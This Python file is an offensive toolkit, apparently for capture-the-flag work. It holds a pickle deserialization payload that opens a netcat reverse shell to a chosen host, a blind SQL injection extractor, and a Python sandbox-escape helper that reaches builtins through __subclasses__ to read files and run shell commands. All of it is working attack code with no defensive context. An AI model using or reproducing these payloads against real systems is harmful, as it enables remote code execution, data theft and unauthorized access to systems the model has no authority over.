#!/usr/bin/env python3
import os
import pickle
import string
import time
import requests

class PickleRevShell:
	def __init__(self, host, port):
		self.host = host
		self.port = port
	
	def __reduce__(self):
		cmd = f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {self.host} {self.port} > /tmp/f"
		return os.system, (cmd, )

def pickle_rev_shell(host, port):
	return pickle.dumps(PickleRevShell(host, port))

_chars = (string.ascii_letters + string.digits + string.punctuation +
	string.whitespace).translate(str.maketrans("", "", "%_*?")) + "_?*%"
# make sure GLOB and LIKE special characters match last

def blind_sqli(inject_template, sqli_oracle, chars=_chars):
	"""sqli_oracle takes a sql condition and returns if its true or false
	inject_template is the template for injecting into sqli_oracle"""
	val = ""
	while True:
		for c in chars:
			try:
				curr_val = val + c
				res = sqli_oracle(inject_template.format(curr_val))
				print(curr_val, res)
				if res:
					val = curr_val
					break
			except requests.exceptions.ConnectionError:  # really bad error handling
				time.sleep(1)
				break
		else:
			return val

class PyJail:
	"""makes interacting with python jails easier"""
	def __init__(self, fn):
		""" fn is the function to interact with the pyjail that takes and returns a string """
		self.fn = fn
		subclasses = "''.__class__.mro()[1].__subclasses__()"
		self.builtins = f"{subclasses}[-1].__init__.__globals__['__builtins__']"
	
	def exec(self, s: str):
		"""directly run with s appended to self.builtins"""
		return self.fn(self.builtins + s)
	
	def call(self, fn: str, *args, module=None):
		if module is None:  # call builtin
			return self.exec(f"[{fn!r}](*{args!r})")
		else:  # import module and then call function
			return self.exec(f"['__import__']({module!r}).{fn}(*{args!r})")
	
	def cat(self, fn):
		return self.exec(f"['open']({fn!r}).read()")
	
	def ls(self, folder="."):
		return self.call("listdir", folder, module="os")
	
	def shell(self, cmd):
		return self.exec(f"['__import__']('os').popen({cmd!r}).read()")
